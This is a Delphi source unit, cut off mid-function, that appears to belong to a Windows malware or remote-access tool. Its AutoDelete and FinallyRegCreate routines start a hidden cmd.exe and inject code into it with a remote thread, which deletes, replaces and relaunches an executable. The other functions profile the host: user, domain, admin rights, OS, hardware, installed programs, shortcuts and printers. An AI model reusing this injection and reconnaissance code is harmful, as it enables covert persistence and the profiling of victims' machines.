unit SysFuncs;

interface

uses Windows, MyUtils, TlHelp32;

type
  // BEGIN AutoDelete
  TParametros = record
    pSleep: procedure(milliseconds: Cardinal); stdcall;
    pDeleteFileA: function(lpFileName: PChar): BOOL; stdcall;
    pLoadLibraryA: function(lpLibFileName: PAnsiChar): HMODULE; stdcall;
    pCopyFileA: function(lpExistingFileName, lpNewFileName: PChar; bFailIfExists: BOOL): BOOL; stdcall;
    pShellExecuteA: function(hWnd: HWND; Operation, FileName, Parameters, Directory: PAnsiChar; ShowCmd: Integer): HINST; stdcall;
    pExitProcess: procedure(uExitCode: UINT); stdcall;
    pOperation, pOldFileName, pNewFileName, pParameters, pDirectory, pShell32Name: PAnsiChar;
  end;
  PParametros = ^TParametros;

  TFinally = record
    pLoadLibraryA: function (lpLibFileName: PAnsiChar): HMODULE; stdcall;
    pSleep: procedure (milliseconds: Cardinal); stdcall;
    pShellExecuteA: function (hWnd: HWND; Operation, FileName, Parameters,
    Directory: PAnsiChar; ShowCmd: Integer): HINST; stdcall;
    pExitProcess: procedure (uExitCode: UINT); stdcall;
    pOperation, pFileName, pParameters, pDirectory, plpLibFileName: PAnsiChar;
  end;
  PFinally = ^TFinally;
  // END AutoDelete
  // BEGIN GetCPUInfo
  TCPUInfo = packed record
    Vendor, Identifier, ProcessorName, ClockSpeed: string;
  end;
  // END GetCPUInfo
  // BEGIN GetOSVersionInfo
  POSVersionInfoEx = ^TOSVersionInfoEx;
  TOSVersionInfoEx = packed record
    dwOSVersionInfoSize : DWORD;
    dwMajorVersion      : DWORD;
    dwMinorVersion      : DWORD;
    dwBuildNumber       : DWORD;
    dwPlatformId        : DWORD;
    szCSDVersion        : array[0..127] of Char;
    wServicePackMajor   : Word;
    wServicePackMinor   : Word;
    wSuiteMask          : Word;
    wProductType        : Byte;
    wReserved           : Byte;
  end;
  // END GetOSVersionInfo
  // BEGIN GetCPUFeatures (Complement)
  TCPUID = array[1..4] of Integer;
  // END GetCPUFeatures (Complement)
  // BEGIN CPUCores
  TCores = packed record
    Cores: Integer;
    Architecture: string;
  end;
  // END CPUCores
  // BEGIN GetKeyNames (Registry)
  TRegKeyInfo = record
    NumSubKeys: Integer;
    MaxSubKeyLen: Integer;
    NumValues: Integer;
    MaxValueLen: Integer;
    MaxDataLen: Integer;
    FileTime: TFileTime;
  end;
  // END GetKeyNames (Registry)
  // BEGIN GetDeviceChange
  PDevBroadcastHdr = ^TDevBroadcastHdr;
  TDevBroadcastHdr = packed record
    dbcd_size: DWORD;
    dbcd_devicetype: DWORD;
    dbcd_reserved: DWORD;
  end;

  PDevBroadcastVolume = ^TDevBroadcastVolume;
  TDevBroadcastVolume = packed record
    dbcv_size: DWORD;
    dbcv_devicetype: DWORD;
    dbcv_reserved: DWORD;
    dbcv_unitmask: DWORD;
    dbcv_flags: Word;
  end;
  // END GetDeviceChange
  // BEGIN GET VOLUME EXTENT
  PDISK_EXTENT = ^DISK_EXTENT;
  _DISK_EXTENT = record
    DiskNumber: DWORD;
    StartingOffset: LARGE_INTEGER;
    ExtentLength: LARGE_INTEGER;
  end;
  DISK_EXTENT = _DISK_EXTENT;
  TDiskExtent = DISK_EXTENT;
  PDiskExtent = PDISK_EXTENT;

  PVOLUME_DISK_EXTENTS = ^VOLUME_DISK_EXTENTS;
  _VOLUME_DISK_EXTENTS = record
    NumberOfDiskExtents: DWORD;
    Extents: array [0..0] of DISK_EXTENT;
  end;
  VOLUME_DISK_EXTENTS = _VOLUME_DISK_EXTENTS;
  TVolumeDiskExtents = VOLUME_DISK_EXTENTS;
  PVolumeDiskExtents = PVOLUME_DISK_EXTENTS;
  // END GET VOLUME EXTENT

const
  IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS: DWORD = 5636096;
  DBT_DEVICEARRIVAL         = $8000; //Event - Device Inserted
  DBT_DEVICEREMOVECOMPLETE  = $8004; //Event - Device Removed
  DBTF_MEDIA                = $0001; //Device Type is Media Device
  DBT_DEVTYP_VOLUME         = $0002; //Device Type is Volumed Device

  VER_NT_WORKSTATION		    = $0000001; //NT Platform
  VER_NT_DOMAIN_CONTROLLER  = $0000002; //Domain Controller Platform
  VER_NT_SERVER             = $0000003; //NT Server Platform

  PRODUCT_HOME_BASIC    = $00000002; //Home Basic
  PRODUCT_HOME_PREMIUM  = $00000003; //Home Premium
  PRODUCT_PROFESSIONAL  = $00000030; //Professional
  PRODUCT_STARTER       = $0000000B; //Starter
  PRODUCT_UNDEFINED     = $00000000; //An unknown product
  PRODUCT_ULTIMATE      = $00000001; //Ultimate

var
  CurrentKey: HKEY;

procedure AutoDelete(OldPath, NewPath: string);
function GetUserName: string;
function GetComputerName: string;
function GetLanguageWin: string;
function IsWindows64: Boolean;
function AdminPriv: Boolean;
function GetOSVersionInfo(var Info: TOSVersionInfoEx): Boolean;
function GetOSDist: string;
function GetOSCompilation: string;
function GetOSVersion: string;
function GetDomain: string;
procedure GetAllInstaledPrograms(Key: string);
procedure GetDir(Dir: string);
procedure GetLnk(Dir: string);
procedure GetPrinters;
function GetVolumeExtent(DriverLetter: Char): TDiskExtent; stdcall;
procedure GetDeviceChange(wParam, lParam: Integer);

function GetCPUInfo: TCPUInfo;
function GetCPUCores: TCores;
function GetRAM: Double;
function GetHDName(Drive: PChar): string;
function GetHDFreeSpace(Drive: PChar): Double;
function GetHDTotSpace(Drive: PChar): Double;

function RegCreate(Name: string): Boolean;
function GetSystemTime: string;
procedure TrimMemorySize;

implementation

{=====================BEGIN COMPLEMENT FUNCTIONS==========================}
{=========================================================================}

procedure RemoteThread_DeleteFile(Parametros: PParametros); stdcall;
begin
  Parametros^.pSleep(5000);
  Parametros^.pDeleteFileA(Parametros^.pOldFileName);
  Parametros^.pLoadLibraryA(Parametros^.pShell32Name);
  Parametros^.pCopyFileA(Parametros^.pNewFileName, Parametros^.pOldFileName, True);
  Parametros^.pDeleteFileA(Parametros^.pNewFileName);
  Parametros^.pShellExecuteA(0, Parametros^.pOperation, Parametros^.pOldFileName, Parametros^.pParameters, Parametros^.pDirectory, 1);
  Parametros^.pExitProcess(0);
end;

procedure RemoteThread_DeleteFileEND; stdcall;
begin
end;

procedure AutoDelete(OldPath, NewPath: string);
 var
  PID, hProcess, ThreadId, ThreadHandle: Cardinal;
  pRemoteData, pRemoteFunc, pOperation, pOldFileName, pNewFileName,
  pParameters, pDirectory, pShell32Name: Pointer;
  Parametros: TParametros;
begin
  try
    WinExec('cmd.exe', SW_HIDE);
    PID := GetProcessIDbyName('cmd.exe');
    hProcess := OpenProcess(PROCESS_CREATE_THREAD + PROCESS_QUERY_INFORMATION + PROCESS_VM_OPERATION +
    PROCESS_VM_WRITE + PROCESS_VM_READ, False, PID);

    pOldFileName:= WriteStringToProcess(hProcess, OldPath);
    pNewFileName:= WriteStringToProcess(hProcess, NewPath);
    pParameters := WriteStringToProcess(hProcess, '');
    pDirectory  := WriteStringToProcess(hProcess, GetCurrentDir);
    pOperation  := WriteStringToProcess(hProcess, 'Open');
    pShell32Name:= WriteStringToProcess(hProcess, 'shell32.dll');

    Parametros.pSleep         := GetProcAddress(GetModuleHandle('kernel32.dll'), 'Sleep');
    Parametros.pDeleteFileA   := GetProcAddress(GetModuleHandle('kernel32.dll'), 'DeleteFileA');
    Parametros.pLoadLibraryA  := GetProcAddress(GetModuleHandle('kernel32.dll'), 'LoadLibraryA');
    Parametros.pCopyFileA     := GetProcAddress(GetModuleHandle('kernel32.dll'), 'CopyFileA');
    Parametros.pShellExecuteA := GetProcAddress(GetModuleHandle('shell32.dll'), 'ShellExecuteA');
    Parametros.pExitProcess   := GetProcAddress(GetModuleHandle('kernel32.dll'), 'ExitProcess');

    Parametros.pOldFileName := pOldFileName;
    Parametros.pNewFileName := pNewFileName;
    Parametros.pParameters  := pParameters;
    Parametros.pDirectory   := pDirectory;
    Parametros.pOperation   := pOperation;
    Parametros.pShell32Name := pShell32Name;

    pRemoteData := WriteDataToProcess(hProcess, SizeOf(Parametros), @Parametros);
    pRemoteFunc := WriteDataToProcess(hProcess, Integer(@RemoteThread_DeleteFileEND) - Integer(@RemoteThread_DeleteFile), @RemoteThread_DeleteFile);

    ThreadHandle := CreateRemoteThread(hProcess, nil, 0, pRemoteFunc, pRemoteData, 0, ThreadId);
    Halt;

    WaitForSingleObject(ThreadHandle, INFINITE);

    VirtualFreeEx(hProcess, pOldFileName, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pNewFileName, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pParameters, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pDirectory, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pOperation, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pShell32Name, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
	  VirtualFreeEx(hProcess, pRemoteFunc, 0, MEM_RELEASE);
  except
    Exit;
  end;
end;

procedure RegCreateFinally(fFinally: PFinally); stdcall;
begin
  fFinally^.pSleep(5000);
  fFinally^.pLoadLibraryA(fFinally^.plpLibFileName);
  fFinally^.pShellExecuteA(0, fFinally^.pOperation, fFinally^.pFileName, fFinally^.pParameters, fFinally^.pDirectory, 1);
  fFinally^.pExitProcess(0);
end;

procedure RegCreateFinallyEND; stdcall;
begin
end;

procedure FinallyRegCreate(Name: string);
 var
  PID, hProcess, ThreadId, ThreadHandle: Cardinal;
  pRemoteData, pRemoteFunc, pOperation, pFileName, pParameters, pDirectory, plpLibFileName: Pointer;
  fFinally: TFinally;
begin
  try
    WinExec('cmd.exe', SW_HIDE);
    PID := GetProcessIDbyName('cmd.exe');
    hProcess := OpenProcess(PROCESS_CREATE_THREAD + PROCESS_QUERY_INFORMATION + PROCESS_VM_OPERATION +
    PROCESS_VM_WRITE + PROCESS_VM_READ, False, PID);

    pParameters := WriteStringToProcess(hProcess, '');
    pDirectory  := WriteStringToProcess(hProcess, 'C:\');
    pOperation  := WriteStringToProcess(hProcess, 'Open');
    pFileName   := WriteStringToProcess(hProcess, 'C:\' + Name + '.exe');
    plpLibFileName := WriteStringToProcess(hProcess, 'shell32.dll');

    fFinally.pLoadLibraryA  := GetProcAddress(GetModuleHandle('kernel32.dll'), 'LoadLibraryA');
    fFinally.pExitProcess   := GetProcAddress(GetModuleHandle('kernel32.dll'), 'ExitProcess');
    fFinally.pSleep         := GetProcAddress(GetModuleHandle('kernel32.dll'), 'Sleep');
    fFinally.pShellExecuteA := GetProcAddress(GetModuleHandle('shell32.dll'), 'ShellExecuteA');
    fFinally.pOperation     := pOperation;
    fFinally.pFileName      := pFileName;
    fFinally.pParameters    := pParameters;
    fFinally.pDirectory     := pDirectory;
    fFinally.plpLibFileName := plpLibFileName;

    pRemoteData := WriteDataToProcess(hProcess, SizeOf(fFinally), @fFinally);
    pRemoteFunc := WriteDataToProcess(hProcess, Integer(@RegCreateFinallyEND) - Integer(@RegCreateFinally), @RegCreateFinally);

    ThreadHandle := CreateRemoteThread(hProcess, nil, 0, pRemoteFunc, pRemoteData, 0, ThreadId);
    Halt;

    WaitForSingleObject(ThreadHandle, INFINITE);

    VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pRemoteFunc, 0, MEM_RELEASE);
  except
    Exit;
  end;
end;

{======================END COMPLEMENT FUNCTIONS===========================}
{======================BEGIN WINDOWS FUNCTIONS============================}

function GetUserName: string;
 var
  User: string;
  Size: DWORD;
begin
  Size := 255;
  User := '';
  SetLength(User, Size);
  GetUserNameA(PChar(User), Size);
  SetLength(User, Size);
  Result := Trim(User);
end;

function GetComputerName: string;
 var
  Comp: string;
  Size: DWORD;
begin
  Size := 255;
  SetLength(Comp, Size);
  GetComputerNameA(PChar(Comp), Size);
  SetLength(Comp, Size);
  Result := Trim(Comp);
end;

function GetLanguageWin: string;
 var
  ID: LangID;
  Language: array [0..100] of Char;
begin
  ID := GetSystemDefaultLangID;
  VerLanguageName(ID, Language, 100);
  Result := string(Language);
end;

function IsWindows64: Boolean;
 type
  TIsWow64Process = function(AHandle: THandle; var AIsWow64: BOOL): BOOL; stdcall;
 var
  vKernel32Handle: DWORD;
  vIsWow64Process: TIsWow64Process;
  vIsWow64: BOOL;
begin
  Result := False;
  vKernel32Handle := LoadLibrary('kernel32.dll');
  if (vKernel32Handle = 0) then
    Exit;
  try
    @vIsWow64Process := GetProcAddress(vKernel32Handle, 'IsWow64Process');
    if not Assigned(vIsWow64Process) then
      Exit;
    vIsWow64 := False;
    if (vIsWow64Process(GetCurrentProcess, vIsWow64)) then
      Result := vIsWow64;
  finally
    FreeLibrary(vKernel32Handle);
  end;
end;

function AdminPriv: Boolean;
 const
  AUTORIDADE_NT_SYSTEM: TSIDIdentifierAuthority = (Value: (0, 0, 0, 0, 0, 5));
  SECURITY_BUILTIN_DOMAIN_RID = $00000020;
  DOMAIN_ALIAS_RID_ADMINS = $00000220;
 var
  x: Integer;
  conseguiu: BOOL;
  AdminPSID: PSID;
  gruposp: PTokenGroups;
  dwInfoBufferSize: DWORD;
  hMascara_acesso: THandle;
begin
  Result := False;
  conseguiu := OpenThreadToken(GetCurrentThread, TOKEN_QUERY, True,hMascara_acesso);
  if not conseguiu then
  begin
    if GetLastError = ERROR_NO_TOKEN then
      conseguiu := OpenProcessToken(GetCurrentProcess, TOKEN_QUERY,hMascara_acesso);
  end;
  if conseguiu then
  begin
    GetMem(gruposp, 1024);
    conseguiu := GetTokenInformation(hMascara_acesso, TokenGroups,gruposp, 1024, dwInfoBufferSize);
    CloseHandle(hMascara_acesso);
    if conseguiu then
    begin
      AllocateAndInitializeSid(AUTORIDADE_NT_SYSTEM, 2,SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, AdminPSID);
      {$R-}
      for x := 0 to gruposp.GroupCount - 1 do
        if EqualSid(AdminPSID, gruposp.Groups[x].Sid) then
        begin
          Result := True;
          Break;
        end;
      {$R+}
      FreeSid(AdminPSID);
    end;
    FreeMem(gruposp);
  end;
end;

function GetProductInfo(WinMajorVersion, WinMinorVersion, SpMajorVersion, SpMinorVersion: DWORD): Integer;
 var
  fGetPdInfo: function(dwOSMajorVersion, dwOSMinorVersion, dwSpMajorVersion, dwSpMinorVersion: DWORD; pdwReturnedProductType: PDWORD): Boolean; stdcall;
  vdwOSMajorVersion, vdwOSMinorVersion, vdwSpMajorVersion, vdwSpMinorVersion, vpdwReturnedProductType: DWORD;
begin
  fGetPdInfo := GetProcAddress(GetModuleHandle('kernel32.dll'), 'GetProductInfo');
  vdwOSMajorVersion := WinMajorVersion;
  vdwOSMinorVersion := WinMinorVersion;
  vdwSpMajorVersion := SpMajorVersion;
  vdwSpMinorVersion := SpMinorVersion;
  fGetPdInfo(vdwOSMajorVersion, vdwOSMinorVersion, vdwSpMajorVersion, vdwSpMinorVersion, @vpdwReturnedProductType);
  Result := vpdwReturnedProductType;
end;

function GetOSVersionInfo(var Info: TOSVersionInfoEx): Boolean;
begin
  FillChar(Info, SizeOf(TOSVersionInfoEx), 0);
  Info.dwOSVersionInfoSize := SizeOf(TOSVersionInfoEx);
  Result := GetVersionExA(TOSVersionInfo(Addr(Info)^));
  if (not Result) then
  begin
    FillChar(Info, SizeOf(TOSVersionInfoEx), 0);
    Info.dwOSVersionInfoSize := SizeOf(TOSVersionInfoEx);
    Result := GetVersionEx(TOSVersionInfo(Addr(Info)^));
    if (not Result) then
      Info.dwOSVersionInfoSize := 0;
  end;
end;

function RemoveNull(const Input: string): string;
 var
  OutputLen, Index: Integer;
  C: Char;
begin
  SetLength(Result, Length(Input));
  OutputLen := 0;
  for Index := 1 to Length(Input) do
  begin
    C := Input[Index];
    if (C <> #0) then
    begin
      inc(OutputLen);
      Result[OutputLen] := C;
    end;
  end;
  SetLength(Result, OutputLen);
end;

function GetOSDist: string;
 var
  Info: TOSVersionInfoEx;
begin
  Result := '';
  if (not GetOSVersionInfo(Info)) then
    Exit;
  SetString(Result, PChar(@Info.szCSDVersion[0]), Length(Info.szCSDVersion));
  Result := RemoveNull(Result);
end;

function GetOSCompilation: string;
 var
  Info: TOSVersionInfoEx;
begin
  Result := '';
  if (not GetOSVersionInfo(Info)) then
    Exit;
  Result := IntToStr(Info.dwMajorVersion) + '.' + IntToStr(Info.dwMinorVersion) + '.' + IntToStr(Info.dwBuildNumber);
end;

function GetOSVersion: string;
 var
  Info: TOSVersionInfoEx;
begin
  Result := '';
  if (not GetOSVersionInfo(Info)) then
    Exit;
  case Info.dwPlatformId of
    { Win32s }
    VER_PLATFORM_WIN32s: Result := 'Win32s';

    { Windows 9x }
    VER_PLATFORM_WIN32_WINDOWS:
    if (Info.dwMajorVersion = 4) and (Info.dwMinorVersion = 0) then
    begin
      Result := 'Windows 95';
      if (Info.szCSDVersion[1] in ['B', 'C']) then
        Result := Result +' OSR2';
    end else if (Info.dwMajorVersion = 4) and (Info.dwMinorVersion = 10) then
    begin
      Result := 'Windows 98';
      if (Info.szCSDVersion[1] = 'A') then
        Result := Result + ' SE';
    end else if (Info.dwMajorVersion = 4) and (Info.dwMinorVersion = 90) then
      Result := 'Windows Millennium Edition';

    { Windows NT }
    VER_PLATFORM_WIN32_NT:
    begin
      if (Info.dwMajorVersion <= 4) then
      begin
        case Info.wProductType of
          VER_NT_WORKSTATION:       Result := 'Windows NT Workstation';
          VER_NT_SERVER:            Result := 'Windows NT Server';
        end;
        Result := Result + ' ' + Info.szCSDVersion;
      end else if (Info.dwMajorVersion = 5) and (Info.dwMinorVersion = 0) then
        Result := 'Windows 2000'
      else if (Info.dwMajorVersion = 5) and (Info.dwMinorVersion = 1) then
        Result := 'Windows XP'
      else if (Info.dwMajorVersion = 5) and (Info.dwMinorVersion = 2) then
        case Info.wProductType of
          VER_NT_WORKSTATION:       Result := 'Windows XP 64-Bit Edition';
          VER_NT_SERVER:            Result := 'Windows Server 2003';
          VER_NT_DOMAIN_CONTROLLER: Result := 'Windows Server 2003 R2';
        end
      else if (Info.dwMajorVersion = 6) and (Info.dwMinorVersion = 0) then
        case Info.wProductType of
          VER_NT_WORKSTATION:       Result := 'Windows Vista';
          VER_NT_SERVER:            Result := 'Windows Server 2008';
        end
      else if (Info.dwMajorVersion = 6) and (Info.dwMinorVersion = 1) then
        case Info.wProductType of
          VER_NT_WORKSTATION:       Result := 'Windows 7';
          VER_NT_SERVER:            Result := 'Windows Server 2008 R2';
        end
      else if (Info.dwMajorVersion = 6) and (Info.dwMinorVersion = 2) then
        case Info.wProductType of
          VER_NT_WORKSTATION:       Result := 'Windows 8';
          VER_NT_SERVER:            Result := 'Windows Server 2012';
        end
      else if (Info.dwMajorVersion = 6) and (Info.dwMinorVersion = 3) then
        case Info.wProductType of
          VER_NT_WORKSTATION:       Result := 'Windows 8.1';
          VER_NT_SERVER:            Result := 'Windows Server 2012 R2';
        end
      else
        Result := '';

      //se o and com a suite mask for diferente de 0 então é aquela versão
      if (Info.dwMajorVersion >= 6) then // Só funciona do Vista para cima
      begin
        case GetProductInfo(Info.dwMajorVersion, Info.dwMinorVersion, Info.wServicePackMajor, Info.wServicePackMinor) of
          PRODUCT_HOME_BASIC:   Result := Result + ' Home Basic';
          PRODUCT_HOME_PREMIUM: Result := Result + ' Home Premium';
          PRODUCT_PROFESSIONAL: Result := Result + ' Professional';
          PRODUCT_STARTER:      Result := Result + ' Starter';
          PRODUCT_ULTIMATE:     Result := Result + ' Ultimate';
          PRODUCT_UNDEFINED:    Result := Result;
        //else
          //Result := Result;
        end;
      end;
    end;
  end;
end;

function GetDomainNT: string;
 type
  TNetWkstaGetInfo = function(servername: PChar; level: Cardinal; out bufptr: Pointer): Cardinal; stdcall;
  TNetApiBufferFree = function(Buffer: Pointer): Cardinal; stdcall;

  PWkstaInfo100 = ^TWkstaInfo100;
  _WKSTA_INFO_100 = record
    wki100_platform_id: DWORD;
    wki100_computername: LPWSTR;
    wki100_langroup: LPWSTR;
    wki100_ver_major: DWORD;
    wki100_ver_minor: DWORD;
  end;
  TWkstaInfo100 = _WKSTA_INFO_100;
  WKSTA_INFO_100 = _WKSTA_INFO_100;

 var
  ngi: TNetWkstaGetInfo;
  nfb: TNetApiBufferFree;
  pwi: PWkstaInfo100;
begin
  @ngi := GetProcAddress(LoadLibrary('netapi32.dll'), 'NetWkstaGetInfo');
  if @ngi = nil then
    Exit;
  @nfb := GetProcAddress(LoadLibrary('netapi32.dll'), 'NetApiBufferFree');
  if @nfb = nil then
    Exit;
  ngi(nil, 100, Pointer(pwi));
  Result := string(pwi.wki100_langroup);
  nfb(pwi);
end;

function GetDomain9x: string;
 var
  OpenKey: HKEY;
  Buffer: array[0..255] of Char;
  Size: DWORD;
begin
  Result := '';
  try
    Size := SizeOf(Buffer);
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, 'System\CurrentControlSet\Services\VxD\VNETSUP',
    0, KEY_READ, OpenKey) = ERROR_SUCCESS) then
    begin
      if RegQueryValueEx(OpenKey, 'Workgroup', nil, nil, @Buffer, @Size) = ERROR_SUCCESS then
        Result := Buffer;
      RegCloseKey(OpenKey);
    end;
  except
    RegCloseKey(OpenKey);
    Exit;
  end;
end;

function GetDomain: string;
 var
  Info: TOSVersionInfoEx;
begin
  Result := '';
  if (not GetOSVersionInfo(Info)) then
    Exit;
  case Info.dwPlatformId of
    VER_PLATFORM_WIN32_WINDOWS: Result := GetDomain9x; //Windows 9x
    VER_PLATFORM_WIN32_NT:      Result := GetDomainNT; //Windows NT
  end;
end;

{=========================================================================}

function GetKeyInfo(var Value: TRegKeyInfo): Boolean;
begin
  FillChar(Value, SizeOf(TRegKeyInfo), 0);
  Result := RegQueryInfoKey(CurrentKey, nil, nil, nil, @Value.NumSubKeys,
  @Value.MaxSubKeyLen, nil, @Value.NumValues, @Value.MaxValueLen,
  @Value.MaxDataLen, nil, @Value.FileTime) = ERROR_SUCCESS;
  //if (Win32Platform = VER_PLATFORM_WIN32_NT) then //SysLocale.FarEast and
  with Value do
  begin
    Inc(MaxSubKeyLen, MaxSubKeyLen);
    Inc(MaxValueLen, MaxValueLen);
  end;
end;

procedure GetKeyNames;
 var
  Len: DWORD;
  I: Integer;
  Info: TRegKeyInfo;
  S: string;
  KeyNames: TextFile;
begin
  if GetKeyInfo(Info) then
  begin
    SetString(S, nil, Info.MaxSubKeyLen + 1);
    for I := 0 to Info.NumSubKeys - 1 do
    begin
      Len := Info.MaxSubKeyLen + 1;
      RegEnumKeyEx(CurrentKey, I, PChar(S), Len, nil, nil, nil, nil);
      AssignFile(KeyNames, GetCurrentDir + '\KeyNames.txt');
      if not FileExists(GetCurrentDir + '\KeyNames.txt') then
      begin
        Rewrite(KeyNames);
        CloseFile(KeyNames);
      end;
      Append(KeyNames);
      Writeln(KeyNames, PChar(S));
      CloseFile(KeyNames);
    end;
  end;
end;

{=========================================================================}

procedure GetAllInstaledPrograms(Key: string);
 var
  Version, Name, Line, Line2, Add: string;
  Buffer: array[0..255] of Char;
  Size: DWORD;
  KeyNames, Programs: TextFile;
  Have: Boolean;
begin
  try
    Buffer := '';
    Size := SizeOf(Buffer);
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, PChar(Key), 0, KEY_READ, CurrentKey) = ERROR_SUCCESS) then
    begin
      GetKeyNames;
      RegCloseKey(CurrentKey);

      AssignFile(Programs, GetCurrentDir + '\Programs.txt');
      if not FileExists(GetCurrentDir + '\Programs.txt') then
      begin
        Rewrite(Programs);
        CloseFile(Programs);
      end;

      AssignFile(KeyNames, GetCurrentDir + '\KeyNames.txt');
      Reset(KeyNames);
      while not EOF(KeyNames) do
      begin
        Readln(KeyNames, Line);
        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, PChar(Key + '\' + Line), 0, KEY_READ, CurrentKey) = ERROR_SUCCESS) then
        begin
          Name := '';
          Version := '';
          if (RegQueryValueEx(CurrentKey, 'DisplayVersion', nil, nil, @Buffer, @Size) = ERROR_SUCCESS) then
            Version := Buffer;
          Buffer := '';
          Size := SizeOf(Buffer);

          if (RegQueryValueEx(CurrentKey, 'DisplayName', nil, nil, @Buffer, @Size) = ERROR_SUCCESS) then
            Name := Buffer;
          Buffer := '';
          Size := SizeOf(Buffer);

          if (Name <> '') then
            if (Version <> '') then
              Add := Name + ' - ' + Version
            else
              Add := Name
          else
            if ((Pos('{', Line) = 0) and (Pos('', Line) = 0)) then
              if (Version <> '') then
                Add := Line + ' - ' + Version
              else
                Add := Line;

          try
            Have := False;
            Reset(Programs);
            while not EOF(Programs) do
            begin
              Readln(Programs, Line2);
              if (Pos(Add, Line2) > 0) then
                Have := True;
            end;
            if (not Have) then
            begin
              CloseFile(Programs);
              Append(Programs);
              Writeln(Programs, Add);
            end;
            CloseFile(Programs);
          except
            CloseFile(Programs);
            Exit;
          end;
          RegCloseKey(CurrentKey);
        end;
      end;
      CloseFile(KeyNames);
    end;
  except
    RegCloseKey(CurrentKey);
    Exit;
  end;
  DeleteFile(PChar(GetCurrentDir + '\KeyNames.txt'));
end;

procedure GetDir(Dir: string);
 var
  H: THandle;
  Name, Line: string;
  Search: TWin32FindData;
  Dirs: TextFile;
  Have: Boolean;
begin
  H := FindFirstFile(PChar(Dir + '*.*'), Search);
  if (H <> DWORD(-1)) then
  repeat
    Name := Search.cFileName;
    if (Name = '.') or (Name = '..') then
      Continue;
    if ((Search.dwFileAttributes and $00000010) <> 0) then
      try
        Have := False;
        AssignFile(Dirs, GetCurrentDir + '\Programs.txt');
        if not FileExists(GetCurrentDir + '\Programs.txt') then
        begin
          Rewrite(Dirs);
          CloseFile(Dirs);
        end;
        Reset(Dirs);
        while not EOF(Dirs) do
        begin
          Readln(Dirs, Line);
          if (Pos(Name, Line) > 0) then
            Have := True;
        end;
        if not Have then
        begin
          CloseFile(Dirs);
          Append(Dirs);
          Writeln(Dirs, Name);
        end;
        CloseFile(Dirs);
      except
        CloseFile(Dirs);
        Exit;
      end;
  until FindNextFile(H, Search) = False;
end;

procedure GetLnk(Dir: string);
 var
  H: THandle;
  Name, Line: string;
  Search: TWin32FindData;
  Dirs: TextFile;
  Have: Boolean;
begin
  H := FindFirstFile(PChar(Dir + '*.*'), Search);
  if (H <> DWORD(-1)) then
  repeat
    Name := Search.cFileName;
    if (Name = '.') or (Name = '..') then
      Continue;
    if ((not ((Search.dwFileAttributes and $00000010) <> 0)) and (Pos('.lnk', Name) > 0)) then
      try
        Have := False;
        AssignFile(Dirs, GetCurrentDir + '\Programs.txt');
        if not FileExists(GetCurrentDir + '\Programs.txt') then
        begin
          Rewrite(Dirs);
          CloseFile(Dirs);
        end;
        Reset(Dirs);
        Delete(Name, Length(Name) - 3, 4);
        while not EOF(Dirs) do
        begin
          Readln(Dirs, Line);
          if (Pos(Name, Line) > 0) then
            Have := True;
        end;
        if not Have then
        begin
          CloseFile(Dirs);
          Append(Dirs);
          Writeln(Dirs, Name);
        end;
        CloseFile(Dirs);
      except
        CloseFile(Dirs);
        Exit;
      end;
  until FindNextFile(H, Search) = False;
end;

procedure GetPrinters;
 type
  PPrinterInfo2A = ^TPrinterInfo2A;
  PPrinterInfo2W = ^TPrinterInfo2W;
  PPrinterInfo2 = PPrinterInfo2A;
  _PRINTER_INFO_2A = record
    pServerName: PAnsiChar;
    pPrinterName: PAnsiChar;
    pShareName: PAnsiChar;
    pPortName: PAnsiChar;
    pDriverName: PAnsiChar;
    pComment: PAnsiChar;
    pLocation: PAnsiChar;
    pDevMode: PDeviceModeA;
    pSepFile: PAnsiChar;
    pPrintProcessor: PAnsiChar;
    pDatatype: PAnsiChar;
    pParameters: PAnsiChar;
    pSecurityDescriptor: PSecurityDescriptor;
    Attributes: DWORD;
    Priority: DWORD;
    DefaultPriority: DWORD;
    StartTime: DWORD;
    UntilTime: DWORD;
    Status: DWORD;
    cJobs: DWORD;
    AveragePPM: DWORD;
  end;

  _PRINTER_INFO_2W = record
    pServerName: PWideChar;
    pPrinterName: PWideChar;
    pShareName: PWideChar;
    pPortName: PWideChar;
    pDriverName: PWideChar;
    pComment: PWideChar;
    pLocation: PWideChar;
    pDevMode: PDeviceModeW;
    pSepFile: PWideChar;
    pPrintProcessor: PWideChar;
    pDatatype: PWideChar;
    pParameters: PWideChar;
    pSecurityDescriptor: PSecurityDescriptor;
    Attributes: DWORD;
    Priority: DWORD;
    DefaultPriority: DWORD;
    StartTime: DWORD;
    UntilTime: DWORD;
    Status: DWORD;
    cJobs: DWORD;
    AveragePPM: DWORD;
  end;
  _PRINTER_INFO_2 = _PRINTER_INFO_2A;
  TPrinterInfo2A = _PRINTER_INFO_2A;
  TPrinterInfo2W = _PRINTER_INFO_2W;
  TPrinterInfo2 = TPrinterInfo2A;
  PRINTER_INFO_2A = _PRINTER_INFO_2A;
  PRINTER_INFO_2W = _PRINTER_INFO_2W;
  PRINTER_INFO_2 = PRINTER_INFO_2A;

 const
  PRINTER_ENUM_LOCAL        = $00000002;
  PRINTER_ENUM_CONNECTIONS  = $00000004;
  PRINTER_ATTRIBUTE_LOCAL   = $00000040;
  PRINTER_ATTRIBUTE_SHARED  = $00000008;

 var
  i: Integer;
  PPrinterEnumArray, PLocator: PPrinterInfo2;
  ArraySize, BufferSize: DWORD;
  Buffer: string;
  TmpName: PChar;
  Aux: TextFile;

  fEnumPrintersA: function(Flags: DWORD; Name: PAnsiChar; Level: DWORD;
  pPrinterEnum: Pointer; cbBuf: DWORD; var pcbNeeded, pcReturned: DWORD): BOOL; stdcall;

  fGetDefaultPrinterA: function(prnName: PAnsiChar; var bufSize: DWORD ): BOOL; stdcall;
begin
  if (not FileExists(GetCurrentDir + '\Data.txt')) then
    Exit;
  AssignFile(Aux, GetCurrentDir + '\Data.txt');
